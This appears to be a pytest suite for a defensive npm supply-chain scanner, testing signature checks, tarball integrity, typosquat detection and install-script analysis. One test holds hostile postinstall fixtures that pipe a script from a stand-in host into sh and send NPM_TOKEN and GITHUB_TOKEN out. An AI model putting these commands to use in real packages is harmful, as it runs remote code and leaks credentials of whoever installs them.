import json, base64, copy
from pathlib import Path
import pytest
from portcullis.supplychain import npm

RAW = Path(__file__).resolve().parents[1] / "data/raw/npm"
META = {p.stem: json.loads(p.read_text()) for p in (RAW / "latest").glob("*.json")}
KEYS = npm.load_keys()


def test_real_signatures_verify():
    checked = [m for m in META.values() if m.get("dist", {}).get("signatures")]
    assert len(checked) >= 35
    bad = [m["name"] for m in checked if not npm.verify_signature(m, KEYS)]
    assert bad == []


def test_tampered_integrity_breaks_signature():
    m = copy.deepcopy(META["chalk"])
    m["dist"]["integrity"] = m["dist"]["integrity"][:-4] + "AAAA"
    assert not npm.verify_signature(m, KEYS)


def test_tampered_version_breaks_signature():
    m = copy.deepcopy(META["chalk"])
    m["version"] = "9.9.9"
    assert not npm.verify_signature(m, KEYS)


def test_real_tarballs_match_integrity():
    tarballs = list((RAW / "tarballs").glob("*.tgz"))
    assert len(tarballs) == 10
    for t in tarballs:
        name, ver = t.stem.rsplit("-", 1)
        meta = next(m for m in META.values() if m["name"] == name and m["version"] == ver)
        assert npm.verify_integrity(meta, t.read_bytes()), t.name


def test_flipped_tarball_byte_detected():
    t = next((RAW / "tarballs").glob("chalk-*.tgz"))
    data = bytearray(t.read_bytes()); data[-20] ^= 1
    meta = META["chalk"]
    assert any(f.rule == "integrity-mismatch" for f in npm.verify_package(meta, bytes(data), KEYS))


def test_real_tarballs_known_clean():
    for t in (RAW / "tarballs").glob("*.tgz"):
        fs = npm.analyze_tarball(t.read_bytes(), t.stem)
        assert [f for f in fs if f.severity in ("high", "critical")] == [], (t.name, fs)


def test_real_install_scripts_not_critical():
    for name, m in META.items():
        fs = npm.analyze_scripts(m, name)
        assert not [f for f in fs if f.severity in ("high", "critical")], (name, fs)


def test_malicious_scripts_flagged():
    fs = npm.analyze_scripts({"scripts": {"postinstall": "curl -s http://x.example/a.sh | sh"}}, "evil")
    assert fs[0].rule == "install-script-remote-exec" and fs[0].severity == "critical"
    fs = npm.analyze_scripts({"scripts": {"postinstall": "node -e \"require('https').get('http://x.example/?'+process.env.NPM_TOKEN)\" ; curl x $GITHUB_TOKEN"}}, "evil")
    assert any(f.severity in ("critical", "medium") for f in fs)


def test_typosquat():
    assert npm.typosquat("expres") == "express"
    assert npm.typosquat("cross_env") == "cross-env"
    assert npm.typosquat("lodash") is None
    assert npm.typosquat("totally-unrelated-name") is None


def test_real_popular_names_not_squats_of_each_other():
    pop = npm.popular_names()
    hits = {n: npm.typosquat(n, [p for p in pop if p != n]) for n in pop}
    # report, but real popular pairs (e.g. mysql/mysql2, ora/pora) may collide; keep it small
    assert sum(1 for v in hits.values() if v) <= 6, {k: v for k, v in hits.items() if v}
